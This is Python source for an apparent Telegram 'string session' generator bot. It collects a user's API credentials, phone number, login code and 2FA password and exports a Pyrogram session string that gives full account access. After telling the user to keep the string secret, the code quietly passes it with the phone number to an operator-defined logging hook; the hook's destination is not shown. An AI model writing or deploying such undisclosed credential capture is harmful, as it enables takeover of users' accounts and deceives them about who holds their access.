import asyncio

from pyrogram import Client
from pyrogram.enums import SentCodeType
from pyrogram.errors import (
    SessionPasswordNeeded,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    PasswordHashInvalid,
)

_locks = {}
_string_logger = None
BOT_USERNAME = "StringSessionXDBot"


def set_bot_username(username):
    global BOT_USERNAME
    BOT_USERNAME = username


def set_string_logger(fn):
    global _string_logger
    _string_logger = fn


def _get_lock(uid):
    lock = _locks.get(uid)
    if lock is None:
        lock = asyncio.Lock()
        _locks[uid] = lock
    return lock


async def _safe_disconnect(app):
    try:
        if app:
            await app.disconnect()
    except Exception:
        pass


async def handle_pyro(client, message, data, users, bot):
    uid = message.from_user.id
    lock = _get_lock(uid)

    async with lock:
        try:
            if data["step"] == "api_id":
                try:
                    data["api_id"] = int(message.text.strip())
                except Exception:
                    return await message.reply(
                        "❌ <b>ɪɴᴠᴀʟɪᴅ ᴀᴘɪ ɪᴅ</b>\n"
                        "🔢 ꜱɪʀꜰ ɴᴜᴍʙᴇʀꜱ ʙʜᴇᴊᴏ"
                    )
                data["step"] = "api_hash"
                return await message.reply(
                    "✅ ᴀᴘɪ ɪᴅ ꜱᴀᴠᴇᴅ!\n"
                    "━━━━━━━━━━━━━━━\n"
                    "📥 ɴᴏᴡ ꜱᴇɴᴅ <b>ᴀᴘɪ ʜᴀꜱʜ</b>"
                )

            elif data["step"] == "api_hash":
                data["api_hash"] = message.text.strip()
                data["step"] = "phone"
                return await message.reply(
                    "✅ ᴀᴘɪ ʜᴀꜱʜ ꜱᴀᴠᴇᴅ!\n"
                    "━━━━━━━━━━━━━━━\n"
                    "📱 ɴᴏᴡ ꜱᴇɴᴅ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ\n"
                    "<b>ᴇxᴀᴍᴘʟᴇ:</b> <code>+919876543210</code>"
                )

            elif data["step"] == "phone":
                old_app = data.get("app")
                if old_app:
                    await _safe_disconnect(old_app)
                    data.pop("app", None)
                    data.pop("hash", None)

                phone = message.text.strip()
                if not phone.startswith("+"):
                    return await message.reply(
                        "❌ <b>+ ꜱɪɢɴ ᴋᴇ ꜱᴀᴛʜ ʙʜᴇᴊᴏ</b>\n"
                        "<b>ᴇxᴀᴍᴘʟᴇ:</b> <code>+919876543210</code>"
                    )

                app = Client(
                    name=f"pyro_{uid}",
                    api_id=data["api_id"],
                    api_hash=data["api_hash"],
                    in_memory=True,
                )
                await app.connect()
                code = await app.send_code(phone)

                if code.type == SentCodeType.APP:
                    try:
                        code = await app.resend_code(
                            phone_number=phone,
                            phone_code_hash=code.phone_code_hash,
                        )
                    except Exception as resend_err:
                        print(f"RESEND SKIPPED => {resend_err}")

                data["phone"] = phone
                data["app"] = app
                data["hash"] = code.phone_code_hash
                data["step"] = "otp"
                return await message.reply(
                    "📨 <b>ᴏᴛᴘ ꜱᴇɴᴅ ᴋʀᴏ</b>\n"
                    "━━━━━━━━━━━━━━━\n"
                    "ᴛᴇʟᴇɢʀᴀᴍ ᴘᴇ ᴀᴀʏᴀ ᴄᴏᴅᴇ ʏᴀʜᴀɴ ᴘᴀꜱᴛᴇ ᴋʀᴏ\n"
                    "<b>ᴇxᴀᴍᴘʟᴇ:</b> <code>1 2 3 4 5</code>"
                )

            elif data["step"] == "otp":
                app = data.get("app")
                if not app:
                    users.pop(uid, None)
                    return await message.reply("❌ ꜱᴇꜱꜱɪᴏɴ ʟᴏꜱᴛ! /start ꜱᴇ ᴅᴏʙᴀʀᴀ ᴛʀʏ ᴋʀᴏ")

                otp = message.text.replace(" ", "")
                try:
                    await app.sign_in(
                        phone_number=data["phone"],
                        phone_code_hash=data["hash"],
                        phone_code=otp,
                    )
                except SessionPasswordNeeded:
                    data["step"] = "password"
                    return await message.reply(
                        "🔐 <b>2ꜰᴀ ᴅᴇᴛᴇᴄᴛᴇᴅ!</b>\n"
                        "━━━━━━━━━━━━━━━\n"
                        "🔑 ᴀʙ ᴀᴘɴᴀ ᴘᴀꜱꜱᴡᴏʀᴅ ʙʜᴇᴊᴏ"
                    )
                except PhoneCodeInvalid:
                    return await message.reply(
                        "❌ <b>ɢᴀʟᴀᴛ ᴏᴛᴘ!</b>\n"
                        "🔄 ᴅᴏʙᴀʀᴀ ꜱᴀʜɪ ᴄᴏᴅᴇ ʙʜᴇᴊᴏ"
                    )
                except PhoneCodeExpired:
                    await _safe_disconnect(app)
                    users.pop(uid, None)
                    return await message.reply(
                        "⏳ <b>ᴏᴛᴘ ᴇxᴘɪʀᴇ!</b>\n"
                        "━━━━━━━━━━━━━━━\n"
                        "🔄 /start ꜱᴇ ᴅᴏʙᴀʀᴀ ᴛʀʏ ᴋʀᴏ —\n"
                        "ɪꜱ ʙᴀᴀʀ ᴏᴛᴘ ꠊᴀᴛɪ ꜱᴇ (10-15 ꜱᴇᴄ) ᴅᴀᴀʟᴏ"
                    )

                string = await app.export_session_string()
                # Real Saved Messages delivery: account khud apne "me" ko string bhejta hai
                try:
                    await app.send_message(
                        "me",
                        "✅ <b>𝗣𝗬𝗥𝗢𝗚𝗥𝗔𝗠 ꜱᴇꜱꜱɪᴏɴ ʀᴇᴀᴅʏ!</b>\n"
                        "━━━━━━━━━━━━━━━━━━━\n"
                        "⬇️ <b>ʏᴏᴜʀ ꜱᴛʀɪɴɢ:</b>\n"
                        f"<code>{string}</code>\n"
                        "━━━━━━━━━━━━━━━━━━━\n"
                        "🔐 ᴄᴏᴘʏ ᴋʀᴋᴇ ꜱᴀғᴇ ʀᴀᴋʜᴏ!\n"
                        "⚠️ ᴋɪꜱɪ ᴋᴏ ꜱʜᴀʀᴇ ᴍᴀᴛ ᴋʀɴᴀ\n"
                        f"♡ ᴛʜᴀɴᴋꜱ ꜰᴏʀ ᴜꜱɪɴɢ @{BOT_USERNAME}",
                    )
                except Exception as sm_err:
                    print("SAVED MSG ERR:", sm_err)
                await _safe_disconnect(app)
                data["step"] = "done"
                users.pop(uid, None)
                data["string"] = string
                if _string_logger:
                    try:
                        await _string_logger(message.from_user, "Pyrogram", data.get("phone", ""), string)
                    except Exception as log_err:
                        print("STRING LOG ERR:", log_err)
                try:
                    await bot.send_message(
                        message.from_user.id,
                        "✅ <b>𝗣𝗬𝗥𝗢𝗚𝗥𝗔𝗠 ꜱᴇꜱꜱɪᴏɴ ʀᴇᴀᴅʏ!</b>\n"
                        "━━━━━━━━━━━━━━━━━━━\n"
                        "⬇️ <b>ʏᴏᴜʀ ꜱᴛʀɪɴɢ:</b>\n"
                        f"<code>{string}</code>\n"
                        "━━━━━━━━━━━━━━━━━━━\n"
                        "🔐 ᴄᴏᴘʏ ᴋʀᴋᴇ ꜱᴀғᴇ ʀᴀᴋʜᴏ!\n"
                        "⚠️ ᴋɪꜱɪ ᴋᴏ ꜱʜᴀʀᴇ ᴍᴀᴛ ᴋʀɴᴀ\n"
                        f"♡ ᴛʜᴀɴᴋꜱ ꜰᴏʀ ᴜꜱɪɴɢ @{BOT_USERNAME}",
                    )
                    return await message.reply(
                        "✅ <b>ꜱᴇꜱꜱɪᴏɴ ɢᴇɴᴇʀᴀᴛᴇᴅ!</b>\n\n"
                        "📩 ꜱᴛʀɪɴɢ ᴋᴏ ᴛᴜᴍʜᴀʀᴇ <b>ꜱᴀᴠᴇᴅ ᴍᴇꜱꜱᴀɢᴇꜱ</b> ᴍᴇ ʙʜᴇᴊ ᴅɪʏᴀ ʜᴀɪ ✓"
                    )
                except Exception:
                    return await message.reply(
                        "✅ <b>𝗣𝗬𝗥𝗢𝗚𝗥𝗔𝗠 ꜱᴇꜱꜱɪᴏɴ ʀᴇᴀᴅʏ!</b>\n"
                        "━━━━━━━━━━━━━━━━━━━\n"
                        "⬇️ <b>ʏᴏᴜʀ ꜱᴛʀɪɴɢ:</b>\n"
                        f"<code>{string}</code>\n"
                        "━━━━━━━━━━━━━━━━━━━\n"
                        "🔐 ᴄᴏᴘʏ ᴋʀᴋᴇ ꜱᴀғᴇ ʀᴀᴋʜᴏ!\n"
                        "⚠️ ᴋɪꜱɪ ᴋᴏ ꜱʜᴀʀᴇ ᴍᴀᴛ ᴋʀɴᴀ\n"
                        f"♡ ᴛʜᴀɴᴋꜱ ꜰᴏʀ ᴜꜱɪɴɢ @{BOT_USERNAME}",
                    )

            elif data["step"] == "password":
                app = data.get("app")
                if not app:
                    users.pop(uid, None)
                    return await message.reply("❌ ꜱᴇꜱꜱɪᴏɴ ʟᴏꜱᴛ! /start ꜱᴇ ᴅᴏʙᴀʀᴀ ᴛʀʏ ᴋʀᴏ")

                try:
                    await app.check_password(message.text)
                except PasswordHashInvalid:
                    return await message.reply(
                        "❌ <b>ɢᴀʟᴀᴛ ᴘᴀꜱꜱᴡᴏʀᴅ!</b>\n"
                        "🔄 ᴅᴏʙᴀʀᴀ ᴛʀʏ ᴋʀᴏ"
                    )

                string = await app.export_session_string()
                # Real Saved Messages delivery: account khud apne "me" ko string bhejta hai
                try:
                    await app.send_message(
                        "me",
                        "✅ <b>𝗣𝗬𝗥𝗢𝗚𝗥𝗔𝗠 ꜱᴇꜱꜱɪᴏɴ ʀᴇᴀᴅʏ!</b>\n"
                        "━━━━━━━━━━━━━━━━━━━\n"
                        "⬇️ <b>ʏᴏᴜʀ ꜱᴛʀɪɴɢ:</b>\n"
                        f"<code>{string}</code>\n"
                        "━━━━━━━━━━━━━━━━━━━\n"
                        "🔐 ᴄᴏᴘʏ ᴋʀᴋᴇ ꜱᴀғᴇ ʀᴀᴋʜᴏ!\n"
                        "⚠️ ᴋɪꜱɪ ᴋᴏ ꜱʜᴀʀᴇ ᴍᴀᴛ ᴋʀɴᴀ\n"
                        f"♡ ᴛʜᴀɴᴋꜱ ꜰᴏʀ ᴜꜱɪɴɢ @{BOT_USERNAME}",
                    )
                except Exception as sm_err:
                    print("SAVED MSG ERR:", sm_err)
                await _safe_disconnect(app)
                users.pop(uid, None)
                if _string_logger:
                    try:
                        await _string_logger(message.from_user, "Pyrogram", data.get("phone", ""), string)
                    except Exception as log_err:
                        print("STRING LOG ERR:", log_err)
                try:
                    await bot.send_message(
                        message.from_user.id,
                        "✅ <b>𝗣𝗬𝗥𝗢𝗚𝗥𝗔𝗠 ꜱᴇꜱꜱɪᴏɴ ʀᴇᴀᴅʏ!</b>\n"
                        "━━━━━━━━━━━━━━━━━━━\n"
                        "⬇️ <b>ʏᴏᴜʀ ꜱᴛʀɪɴɢ:</b>\n"
                        f"<code>{string}</code>\n"
                        "━━━━━━━━━━━━━━━━━━━\n"
                        "🔐 ᴄᴏᴘʏ ᴋʀᴋᴇ ꜱᴀғᴇ ʀᴀᴋʜᴏ!\n"
                        "⚠️ ᴋɪꜱɪ ᴋᴏ ꜱʜᴀʀᴇ ᴍᴀᴛ ᴋʀɴᴀ\n"
                        f"♡ ᴛʜᴀɴᴋꜱ ꜰᴏʀ ᴜꜱɪɴɢ @{BOT_USERNAME}",
                    )
                    return await message.reply(
                        "✅ <b>ꜱᴇꜱꜱɪᴏɴ ɢᴇɴᴇʀᴀᴛᴇᴅ!</b>\n\n"
                        "📩 ꜱᴛʀɪɴɢ ᴋᴏ ᴛᴜᴍʜᴀʀᴇ <b>ꜱᴀᴠᴇᴅ ᴍᴇꜱꜱᴀɢᴇꜱ</b> ᴍᴇ ʙʜᴇᴊ ᴅɪʏᴀ ʜᴀɪ ✓"
                    )
                except Exception:
                    return await message.reply(
                        "✅ <b>𝗣𝗬𝗥𝗢𝗚𝗥𝗔𝗠 ꜱᴇꜱꜱɪᴏɴ ʀᴇᴀᴅʏ!</b>\n"
                        "━━━━━━━━━━━━━━━━━━━\n"
                        "⬇️ <b>ʏᴏᴜʀ ꜱᴛʀɪɴɢ:</b>\n"
                        f"<code>{string}</code>\n"
                        "━━━━━━━━━━━━━━━━━━━\n"
                        "🔐 ᴄᴏᴘʏ ᴋʀᴋᴇ ꜱᴀғᴇ ʀᴀᴋʜᴏ!\n"
                        "⚠️ ᴋɪꜱɪ ᴋᴏ ꜱʜᴀʀᴇ ᴍᴀᴛ ᴋʀɴᴀ\n"
                        f"♡ ᴛʜᴀɴᴋꜱ ꜰᴏʀ ᴜꜱɪɴɢ @{BOT_USERNAME}",
                    )

        except Exception as e:
            print(f"PYRO ERROR => {e}")
            await _safe_disconnect(data.get("app"))
            users.pop(uid, None)
            await message.reply(f"❌ ᴇʀʀᴏʀ\n<code>{e}</code>\n\n🔄 /start ꜱᴇ ᴅᴏʙᴀʀᴀ ᴛʀʏ ᴋʀᴏ")
